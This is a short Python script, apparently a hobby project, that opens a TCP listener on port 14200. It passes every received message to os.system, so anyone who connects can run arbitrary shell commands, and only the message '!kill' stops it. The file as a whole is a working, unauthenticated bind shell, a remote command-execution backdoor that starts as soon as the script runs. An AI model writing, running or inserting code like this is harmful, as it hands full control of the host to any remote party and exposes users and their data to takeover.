import socket
import os
import sys
#made it lol
conRunning = True;

def createServer():
    print("Server Running");
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    ip = socket.gethostbyname(socket.gethostname());
    port = 14200
    sock.bind((ip, port));
    sock.listen(1);
    conn, addr = sock.accept();

    while(True):
            incData = conn.recv(1024);
            r = handleCommands(incData.decode());
            if(r == "kill"):
                return "Server Ended";
            conn.send(str.encode("Server executed Message"));

    return "statement should never be hit";

def createServer_con():
    global conRunning;
    while(conRunning):
        createServer();

def handleCommands(incDataRaw):
    global conRunning;
    if(incDataRaw == "!kill"):
        conRunning = False;
        return "kill";
    else:
        os.system(incDataRaw);
        return "success";

def testLocalScript():
    createServer_con();

testLocalScript();